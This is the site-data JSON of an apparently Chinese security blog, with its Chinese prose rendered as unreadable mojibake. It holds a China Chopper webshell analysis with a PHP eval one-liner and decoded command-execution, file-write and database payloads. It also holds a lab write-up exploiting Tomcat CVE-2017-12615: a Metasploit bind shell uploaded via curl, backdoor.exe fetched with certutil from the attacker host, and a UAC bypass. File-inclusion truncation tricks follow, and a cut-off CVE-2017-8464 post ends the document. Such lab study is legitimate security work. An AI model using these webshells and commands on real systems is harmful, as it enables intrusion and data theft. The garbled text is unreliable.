{"meta":{"title":"Sheng 's blog","subtitle":"Sheng","description":"","author":"Sheng","url":"https://ms12020.github.io","root":"/"},"pages":[{"title":"404","date":"2020-05-29T16:00:00.000Z","updated":"2021-04-10T11:08:39.449Z","comments":true,"path":"404/index.html","permalink":"https://ms12020.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:54.282Z","comments":true,"path":"about/index.html","permalink":"https://ms12020.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:13.530Z","comments":true,"path":"categories/index.html","permalink":"https://ms12020.github.io/categories/index.html","excerpt":"","text":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T12:22:13.221Z","comments":true,"path":"contact/index.html","permalink":"https://ms12020.github.io/contact/index.html","excerpt":"","text":"ç•™è¨€æ¿å°šæœªå¼€æ”¾ï¼Œæƒ³è¦ç•™è¨€å¯åŠ ä½œè€…QQå¹¶è¿›è¡Œè”ç³»ã€‚"},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-04-10T11:07:39.931Z","comments":true,"path":"friends/index.html","permalink":"https://ms12020.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-10T10:23:38.000Z","updated":"2021-04-10T11:06:34.186Z","comments":true,"path":"tags/index.html","permalink":"https://ms12020.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ä¸­å›½èœåˆ€åŸç†","slug":"ä¸­å›½èœåˆ€åŸç†è§£æ","date":"2021-05-08T03:55:05.427Z","updated":"2021-05-08T04:03:49.894Z","comments":true,"path":"2021/05/08/ä¸­å›½èœåˆ€åŸç†è§£æ/","link":"","permalink":"https://ms12020.github.io/2021/05/08/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/","excerpt":"","text":"ä¸­å›½èœåˆ€åŸç† æœ¬åœ°IPï¼š 172.16.9.12 ç›®çš„IPï¼š 172.16.9.163 WebShell URLï¼š http://172.16..9.163/test.php WebShell å¯†ç ï¼š cmd æŠ“å–èœåˆ€æµé‡ ä½¿ç”¨Wiresharkè¿›è¡Œæµé‡æŠ“å– # è¿‡æ»¤è¯­å¥ http.request.method == POST and ip.addr == 172.16.9.12 ä¸€å¥è¯æœ¨é©¬åŸç†&lt;?php eval($_POST[cmd])?> # æœ€åŸºç¡€çš„PHPä¸€å¥è¯æœ¨é©¬ # $_POSTç”¨äºæ”¶é›†ä¼ é€’è¿‡æ¥çš„æ•°æ® # evalå°†ä¼ é€’è¿‡æ¥çš„æ•°æ®å½“åšå¯ä»¥æ‰§è¡Œçš„PHPä»£ç æ¥æ‰§è¡Œ # è¿™æ ·å°±å¯ä»¥å°†ä»»æ„çš„PHPè¯­å¥ä¼ å…¥åˆ°ç½‘ç«™æ‰€åœ¨çš„æœåŠ¡å™¨è¿›è¡Œæ‰§è¡Œã€‚ èœåˆ€æµé‡åˆ†æè¿æ¥åŠŸèƒ½ ä½¿ç”¨èœåˆ€è¿æ¥WebShell é€šè¿‡postä¼ å…¥çš„cmdå‚æ•°ï¼Œå‚æ•°è¿›è¡Œäº†base64åŠ å¯† # åŸå§‹æ•°æ® QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D # urlè§£ç  QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw== # base64è§£ç  @ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\"->|\");;$D=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);$R=\"&amp;#123;$D&amp;#125;\\t\";if(substr($D,0,1)!=\"/\")&amp;#123;foreach(range(\"A\",\"Z\") as $L)if(is_dir(\"&amp;#123;$L&amp;#125;:\"))$R.=\"&amp;#123;$L&amp;#125;:\";&amp;#125;$R.=\"\\t\";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.=\"(&amp;#123;$usr&amp;#125;)\";print $R;;echo(\"|&lt;-\");die(); è§£ç åå¾—åˆ°ä¼ å…¥çš„å…·ä½“payload &lt;?php // ä¸´æ—¶å…³é—­PHPçš„é”™è¯¯æ˜¾ç¤ºåŠŸèƒ½ @ini_set(\"display_errors\", \"0\"); // é˜²æ­¢åƒdirã€ä¸Šä¼ æ–‡ä»¶å¤§é©¬æ—¶è¶…æ—¶ @set_time_limit(0); // å…³é—­é­”æœ¯å¼•å·ï¼Œè¿™ä¸œè¥¿åœ¨4.0ä»¥åå°±ä¸æ€ä¹ˆç”¨äº† @set_magic_quotes_runtime(0); echo(\"->|\");; // å°†è®¿é—®çš„è·¯å¾„å¤åˆ¶ç»™äº†$D $D = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if ($D == \"\") $D = dirname($_SERVER[\"PATH_TRANSLATED\"]); // æ‰“å¼€æŒ‡å®šè·¯å¾„åå°†è¿”å›å€¼èµ‹å€¼ç»™äº†$R $R = \"&amp;#123;$D&amp;#125;\\t\"; if (substr($D, 0, 1) != \"/\") &amp;#123; foreach (range(\"A\", \"Z\") as $L) if (is_dir(\"&amp;#123;$L&amp;#125;:\")) $R .= \"&amp;#123;$L&amp;#125;:\"; &amp;#125; $R .= \"\\t\"; // å°†$Rçš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸å­˜åœ¨å°±è¾“å‡ºPATH_TRANSLATED $u = (function_exists('posix_getegid')) ? @posix_getpwuid(@posix_geteuid()) : ''; $usr = ($u) ? $u['name'] : @get_current_user(); $R .= php_uname(); $R .= \"(&amp;#123;$usr&amp;#125;)\"; print $R;; echo(\"|&lt;-\"); die(); ?> æ–‡ä»¶ç®¡ç†åŠŸèƒ½ å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‚æ•°z0å’Œz1ï¼š z0ä¸ºå‘é€çš„payload z1ä¸ºæŸ¥è¯¢çš„è·¯å¾„ # z0ä¼ å…¥çš„payload &lt;?php @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); @set_magic_quotes_runtime(0); echo(\"->|\");; $D = base64_decode($_POST[\"z1\"]); $F = @opendir($D); if ($F == NULL) &amp;#123; echo(\"ERROR:// Path Not Found Or No Permission!\"); &amp;#125; else &amp;#123; $M = NULL; $L = NULL; // å¯¹ç›®å½•è¿›è¡Œå¾ªç¯æ‰«æ while ($N = @readdir($F)) &amp;#123; // è·å–ç›®å½•ä¸­æ–‡ä»¶ $P = $D.\"/\".$N; // è·å–æ–‡ä»¶æ—¶é—´ $T = @date(\"Y-m-d H:i:s\", @filemtime($P)); // è·å–æ–‡ä»¶æƒé™ @$E = substr(base_convert(@fileperms($P), 10, 8), -4); // è·å–æ–‡ä»¶å¤§å° $R = \"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\"; if(@is_dir($P))&amp;#123; $M .= $N.\"/\".$R; &amp;#125;else&amp;#123; $L .= $N.$R; &amp;#125; &amp;#125; echo $M.$L; @closedir($F); &amp;#125;; echo(\"|&lt;-\"); die(); # è·å–äº†è·¯å¾„å‚æ•°ä¹‹åï¼Œä»£ç å°†æŒ‡å®šè·¯å¾„çš„å¥æŸ„æ‰“å¼€ï¼Œå¯¹ç›®å½•è¿›è¡Œå¾ªç¯æ‰«æï¼Œè·å–ç›®å½•ä¸­çš„æ–‡ä»¶ä»¥åŠæ–‡ä»¶çš„æƒé™ï¼Œå¤§å°ï¼Œæ—¶é—´ï¼Œæ—¥æœŸè¿™å››ä¸ªå‚æ•°ï¼Œä½¿ç”¨\\tåˆ¶è¡¨ç¬¦æ‹¼åœ¨ä¸€èµ·æ†ç»‘å‘é€å›å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼Œå¹¶å°†è·å–çš„å‚æ•°å½¢æˆæ˜¾ç¤ºçš„ç•Œé¢ # z1 url+base64è§£ç ï¼ˆæŸ¥è¯¢çš„è·¯å¾„ï¼‰ C:\\\\ payloadä¸­å¤§è‡´å‡½æ•°è§£æå¦‚ä¸‹ï¼š opendir() å‡½æ•°ï¼šæ‰“å¼€ä¸€ä¸ªç›®å½•å¥æŸ„ï¼Œå¯ç”±closedir()ï¼Œreaddir() å’Œrewinddir()ä½¿ç”¨ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªç›®å½•æµï¼Œå¦åˆ™è¿”å› false ä»¥åŠä¸€ä¸ª errorã€‚å¯ä»¥é€šè¿‡åœ¨å‡½æ•°åå‰åŠ ä¸Š@æ¥éšè— é”™è¯¯è¾“å‡ºã€‚ readdir() å‡½æ•°ï¼šè¿”å›ç”±opendir()æ‰“å¼€çš„ç›®å½•å¥æŸ„ä¸­çš„æ¡ç›®ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæ–‡ä»¶åï¼Œå¦åˆ™è¿”å› falseã€‚ fileperms() å‡½æ•°ï¼šè¿”å›æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›æ–‡ä»¶çš„è®¿é—®æƒé™ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚ base_convert(number,frombase,tobase) filesize() å‡½æ•°ï¼šè¿”å›æŒ‡å®šæ–‡ä»¶çš„å¤§å°ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›æ–‡ä»¶å¤§å°çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› false å¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚ filemtime() å‡½æ•°ï¼šè¿”å›æ–‡ä»¶å†…å®¹çš„ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´ã€‚å¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°å°†ä»¥ Unix æ—¶é—´æˆ³å½¢å¼è¿”å›æ–‡ä»¶å†…å®¹çš„ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚ closedir() å‡½æ•°ï¼šå…³é—­ç›®å½•å¥æŸ„ã€‚ æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½é€šå¸¸ç”¨æ¥ä¸Šä¼ é«˜æƒé™çš„å¤§å‹æœ¨é©¬ï¼Œç”¨æ¥å»ºç«‹æ›´ç¨³å›ºåŠŸèƒ½æ›´å¤šçš„è¿æ¥ã€‚ ä¸ºäº†æ–¹ä¾¿ï¼Œè¿™é‡Œä¸Šä¼ ä¸€ä¸ªtest.txtä½œä¸ºå®éªŒå¯¹è±¡ã€‚ æœ‰ä¸‰ä¸ªå‚æ•° è§£ç å # z0 @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); @set_magic_quotes_runtime(0); echo(\"->|\"); $f = base64_decode($_POST[\"z1\"]); $c = $_POST[\"z2\"]; $c = str_replace(\"\\r\", \"\", $c); $c = str_replace(\"\\n\", \"\", $c); $buf = \"\"; for($i=0;$i&lt;strlen($c);$i+=2) $buf.=urldecode(\"%\".substr($c,$i,2)); echo(@fwrite(fopen($f,\"w\"),$buf)?\"1\":\"0\"); echo(\"|&lt;-\"); die(); # å°†æ–‡ä»¶åˆ›å»ºå¹¶å°†å†…å®¹å†™å…¥ï¼Œç„¶åèœåˆ€ä¼šå†æ¬¡å‘é€æ—¶æ•°æ®åŒ…å¯¹ç›®å½•è¿›è¡Œè¯·æ±‚ï¼Œåˆ·æ–°ç›®å½•åˆ—è¡¨ï¼Œä¸ä¸Šé¢è¯·æ±‚ç›®å½•çš„ä»£ç ä¸€æ · # z1 base64è§£ç ï¼ˆä¸Šä¼ è·¯å¾„ï¼‰ C:\\\\test.txt # z2 16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼ˆä¸Šä¼ æ–‡ä»¶å†…å®¹ï¼‰ hello word å…³é”®å‡½æ•°ï¼š fwrite() å‡½æ•°ï¼šå°†å†…å®¹å†™å…¥ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ä¸­ã€‚å‡½æ•°ä¼šåœ¨åˆ°è¾¾æŒ‡å®šé•¿åº¦æˆ–è¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰æ—¶ï¼ˆä»¥å…ˆåˆ°è€…ä¸ºå‡†ï¼‰ï¼Œåœæ­¢è¿è¡Œã€‚å¦‚æœå‡½æ•°æˆåŠŸæ‰§è¡Œï¼Œåˆ™è¿”å›å†™å…¥çš„å­—èŠ‚æ•°ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚ å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½èœåˆ€çš„è¿œç¨‹ç»ˆç«¯æ¨¡æ‹ŸåŠŸèƒ½ï¼Œå³cmd æœ‰ä¸‰ä¸ªå‚æ•° è§£ç å # z0 @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); @set_magic_quotes_runtime(0); echo(\"->|\");; $p = base64_decode($_POST[\"z1\"]); $s = base64_decode($_POST[\"z2\"]); // dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ // $_SERVER[\"SCRIPT_FILENAME\"]ï¼šå½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„ã€‚ // å¦‚æœåœ¨å‘½ä»¤è¡Œç•Œé¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ‰§è¡Œè„šæœ¬ï¼Œä¾‹å¦‚ file.php æˆ– ../file.phpï¼Œé‚£ä¹ˆ $_SERVER['SCRIPT_FILENAME'] å°†åŒ…å«ç”¨æˆ·æŒ‡å®šçš„ç›¸å¯¹è·¯å¾„ã€‚ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); // substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚ // ç”¨æ•è·åˆ†ç»„è·å¾—å­—ç¬¦ä¸²ä¸­çš„å‚æ•°ï¼Œç”¨æ¥å¯¹è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡ŒåŒ¹é… $c = substr($d, 0, 1) == \"/\" ? \"-c \\\"&amp;#123;$s&amp;#125;\\\"\" : \"/c \\\"&amp;#123;$s&amp;#125;\\\"\"; $r = \"&amp;#123;$p&amp;#125; &amp;#123;$c&amp;#125;\"; // æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å±è”½é”™è¯¯æ˜¾ç¤ºã€‚ @system($r.\" 2>&amp;1\", $ret); print($ret != 0) ? \"ret = &amp;#123;$ret&amp;#125;\":\"\";; echo(\"|&lt;-\"); die(); # z1 cmd # z2 ï¼ˆæ‰§è¡Œçš„å‘½ä»¤ï¼‰ cd /d \"C:\\AppServ\\www\\\"&amp;ipconfig&amp;echo [S]&amp;cd&amp;echo [E] æ•°æ®åº“æ¨¡æ‹ŸåŠŸèƒ½ èœåˆ€çš„æ•°æ®åº“é…ç½® æ•°æ®è§£ç  @ini_set (\"display_errors\", \"0\"); @set_time_limit (0); @set_magic_quotes_runtime (0); echo (\"->|\"); // å¦‚æœ magic_quotes_gpc ä¸ºå…³é—­æ—¶è¿”å› 0ï¼Œå¦åˆ™è¿”å› 1ã€‚åœ¨ PHP 5.4.O èµ·å°†å§‹ç»ˆè¿”å› FALSEã€‚ $m = get_magic_quotes_gpc(); // stripslashes() åˆ é™¤åæ–œæ  $conf = $m ? stripslashes($_POST[\"z1\"]) : $_POST[\"z1\"]; // explode() å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ $ar = explode(\"choraheiheihei\", $conf); $dbn = $m ? stripslashes ($_POST[\"z2\"]) : $_POST[\"z2\"]; $sql = base64_decode($_POST[\"z3\"]); $T = @mysql_connect($ar[0],$ar[1],$ar[2]); @mysql_query (\"SET NAMES utf8\"); if($dbn == \"\")&amp;#123; $sql = \"SHOW DATABASES\"; $q = @mysql_query($sql); $i = 0; // mysql_fetch_row() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„ã€‚ while($rs = @mysql_fetch_row($q))&amp;#123; echo(trim($rs[0]).chr(9)).\"\\t|\\t\\r\\n\"; &amp;#125; @mysql_close($T); echo(\"|&lt;-\"); die(); &amp;#125;else&amp;#123; @mysql_select_db($dbn); $q = @mysql_query($sql); $i = 0; while ( $col = @mysql_field_name($q, $i))&amp;#123; echo ($col . \"\\t|\\t\"); $i ++; &amp;#125; echo (\"\\r\\n\"); while ( $rs = @mysql_fetch_row($q))&amp;#123; for($c = 0; $c &lt; $i; $c ++)&amp;#123; echo (trim($rs[$c])); echo (\"\\t|\\t\"); &amp;#125; echo(\"\\r\\n\"); &amp;#125; @mysql_close($T); echo (\"|&lt;-\"); die (); &amp;#125; # ä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ä¸ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“ç®€å†è¿æ¥ï¼ˆå…·ä½“ï¼‰ï¼Œè·å–æ•°æ®åº“çš„åº“ï¼Œè¡¨ï¼Œåˆ—å­—æ®µç­‰å†…å®¹ï¼Œå¹¶å°†æˆ‘ä»¬å¯¹æ•°æ®åº“çš„æ“ä½œä¼ é€’è¿‡å»ï¼Œå¹¶å°†æ‰§è¡Œç»“æœä¼ é€’å›æ¥ã€‚ # åœ¨èœåˆ€é‡Œç›´æ¥ç‚¹å‡»å¯¹åº”çš„æ•°æ®åº“å†…å®¹ï¼Œèœåˆ€ä¼šç›´æ¥ç”Ÿæˆå¯¹åº”çš„è¯­å¥ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œæ“ä½œ","categories":[],"tags":[{"name":"åŸç†","slug":"åŸç†","permalink":"https://ms12020.github.io/tags/%E5%8E%9F%E7%90%86/"}]},{"title":"ä¸€æ¬¡windowsæ¸—é€æµ‹è¯•","slug":"ä¸€æ¬¡Windowsæ¸—é€æµ‹è¯•","date":"2021-05-06T13:52:15.970Z","updated":"2021-05-06T14:00:57.142Z","comments":true,"path":"2021/05/06/ä¸€æ¬¡Windowsæ¸—é€æµ‹è¯•/","link":"","permalink":"https://ms12020.github.io/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"windowså†…æ ¸ææƒå®æˆ˜kali IP: 172.16.10.111 é¶æœºIP: 172.16.10.180 2021-05-06è‡ªæ­ç¯å¢ƒï¼Œæ¼æ´ä¸ºTomcat PUT ï¼ˆcve-2017-12615ï¼‰ msfä½¿ç”¨tomcat_jsp_upload_bypassæ¨¡å— æ‰‹å·¥å¤ç°å¯¹Webåº”ç”¨æ¼æ´æ‰«ææ¢æµ‹ å‘ç°æœåŠ¡çš„HTTP methodæ–¹æ³•ä¸­å…è®¸PUTï¼ŒDELETEï¼Œå…è®¸å®¢æˆ·ç«¯ä¿å­˜æ–‡ä»¶è‡³æœåŠ¡å™¨ä¸Š ç”Ÿæˆjspåå¼¹æœ¨é©¬â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# msfconsole msf6 > use payload/windows/shell_bind_tcp msf6 payload(windows/shell_bind_tcp) > set lport 4449 msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp [*] Writing 149075 bytes to shell.jsp... ä¸Šä¼ jspæœ¨é©¬ ä½¿ç”¨curlï¼Œé€šè¿‡PUTæ–¹å¼ä¸Šä¼ /test.jsp/æ–‡ä»¶ curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp è®¿é—®Webæœ¨é©¬ ä½¿ç”¨ncè¿æ¥nc 172.16.10.180 4449 åå¼¹shell åœ¨Cç›˜ä¸‹åˆ›å»ºbackç›®å½• chcp 437 //å°†ç¼–ç æ”¹ä¸ºè‹±æ–‡ï¼Œä¸ä¼šå‡ºç°ä¹±ç  cd c:\\ mkdir back cd c:\\back ä¸Šä¼ backdoor.exeåé—¨ â”Œâ”€â”€(rootğŸ’€kali)-[~] â””â”€# msfpc windows 172.16.10.111 pythonå¿«é€Ÿå¼€å¯httpæœåŠ¡ python3 -m http.server 8180 é¶æœºè¿œç¨‹ä¸‹è½½backdoor.exe certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe kaliå¼€å¯ç›‘å¬ â”€â”€(rootğŸ’€kali)-[/home/sheng] â””â”€# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc é¶æœºæ‰§è¡Œbackdoor.exe c:\\back>backdoor.exe backdoor.exe å¾—åˆ°shell ææƒ ä½¿ç”¨msfä¸­post/multi/recon/local_exploit_suggesteræ¨¡å—æŸ¥çœ‹å¯åˆ©ç”¨çš„ææƒæ¨¡å— msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester msf6 post(multi/recon/local_exploit_suggester) > set session 1 session => 1 msf6 post(multi/recon/local_exploit_suggester) > exploit ä½¿ç”¨exploit/windows/local/bypassuac_eventvwræ¨¡å—è¿›è¡Œææƒ å¾—åˆ°systemæƒé™ï¼ŒææƒæˆåŠŸ","categories":[],"tags":[{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´-æ–‡ä»¶åŒ…å«æˆªæ–­","slug":"æ–‡ä»¶åŒ…å«æˆªæ–­","date":"2021-05-05T03:22:29.006Z","updated":"2021-05-05T03:25:45.574Z","comments":true,"path":"2021/05/05/æ–‡ä»¶åŒ…å«æˆªæ–­/","link":"","permalink":"https://ms12020.github.io/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/","excerpt":"","text":"æ–‡ä»¶åŒ…å«æˆªæ–­åˆ©ç”¨%00æˆªæ–­%00æˆªæ–­å—é™äºGPCå’Œaddslashes()ç­‰å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å¼€å¯GPCæˆ–è€…ä½¿ç”¨è¿‡æ»¤å‡½æ•°è¿‡æ»¤çš„æƒ…å†µä¸‹ä¸èƒ½ä½¿ç”¨ï¼Œåœ¨PHP 5.3ä¹‹åçš„ç‰ˆæœ¬å…¨é¢ä¿®å¤äº†æ–‡ä»¶å%00æˆªæ–­çš„é—®é¢˜ã€‚ &lt;?php include $_GET['url'].'.php'; ?> å½“urlå‚æ•°è¢«è¿‡æ»¤æ—¶ %00è¢«è½¬ä¹‰æˆäº†0 0ä¸¤ä¸ªå•ä½“å­—ç¬¦ï¼Œä¸å†å…·æœ‰æˆªæ–­åŠŸèƒ½ åˆ©ç”¨./æˆªæ–­åˆ©ç”¨å¤šä¸ª./æ¥æˆªæ–­ï¼Œè¿™ç§æ–¹å¼ä¸å—é™äºGPCï¼Œä½†æ˜¯åŒæ ·åœ¨PHP 5.3ç‰ˆæœ¬ä¹‹åè¢«ä¿®å¤ã€‚ åœ¨windowsä¸‹ä½¿ç”¨240ä¸ªç‚¹(.)è¿æ¥å¯ä»¥æˆªæ–­ &lt;?php $str = ''; for($i = 0; $i &lt;= 240, $i++)&amp;#123; $str .= '.'; &amp;#125; $str = '2.txt'.$str; echo $str; include $str.'.php'; ?> åœ¨windowsä¸‹ï¼Œ./å…±240ä¸ªèƒ½å¤Ÿæˆªæ–­ã€‚ &lt;?php $str = ''; for($i = 0; $i &lt;= 118, $i++)&amp;#123; $str .= './'; &amp;#125; $str = '2.txt'.$str; echo $str; include $str.'.php'; ?> linuxä¸‹éœ€è¦2038ä¸ª./ç»„åˆæ‰èƒ½æˆªæ–­ã€‚ åˆ©ç”¨?ä¼ªæˆªæ–­è¿œç¨‹åŒ…å«æ—¶åˆ©ç”¨é—®å·?æ¥æˆªæ–­ï¼Œä¸å—GPCå’ŒPHPç‰ˆæœ¬çš„å½±å“ï¼Œåªè¦èƒ½å¤Ÿè¿”å›ä»£ç ç»™åŒ…å«å‡½æ•°ï¼Œå®ƒå°±èƒ½æ‰§è¡Œã€‚ åœ¨HTTPåè®®ä¸­ï¼Œè®¿é—®http://remotehost/1.txtå’Œè®¿é—®httpL://remotehost/1.txt?.phpçš„è¿”å›ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºè¿™æ—¶å€™WebServeræŠŠ?ä¹‹åçš„å†…å®¹å½“ä½œæ˜¯è¯·æ±‚å‚æ•°ï¼Œè€Œtxtä¸åœ¨WebServeré‡Œé¢è§£æï¼Œå‚æ•°å¯¹è®¿é—®1.txtè¿”å›çš„å†…å®¹ä¸å½±å“ï¼Œäºæ˜¯å°±å®ç°äº†ä¼ªæˆªæ–­ã€‚ &lt;?php echo $_GET['url'].'.php'; include $_GET['url'].'.php'; ?>","categories":[],"tags":[{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://ms12020.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"Web","slug":"Web","permalink":"https://ms12020.github.io/tags/Web/"}]},{"title":"CVE-2017-8464(å¿«æ·æ–¹å¼è¿œç¨‹ä»£ç æ‰§è¡Œ)æ¼æ´å¤ç°","slug":"åˆ©ç”¨CVE-2017-8464æ¼æ´å®ç°LNKæ–‡ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œ","date":"2021-05-03T03:33:59.636Z","updated":"2021-05-03T03:35:19.915Z","comments":true,"path":"2021/05/03/åˆ©ç”¨CVE-2017-8464æ¼æ´å®ç°LNKæ–‡ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œ/","link":"","permalink":"https://ms12020.github.io/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"CVE-2017-8464(å¿«æ·æ–¹å¼è¿œç¨‹ä»£ç æ‰§è¡Œ)æ¼æ´æè¿°å¾®è½¯2017å¹´06æœˆ13æ—¥å…¬å¸ƒä¸¤ä¸ªå¯è¢«åˆ©ç”¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å…¶ä¸­**(CVE-2017-8464)LNKæ–‡ä»¶è¿œç¨‹ä»£ç 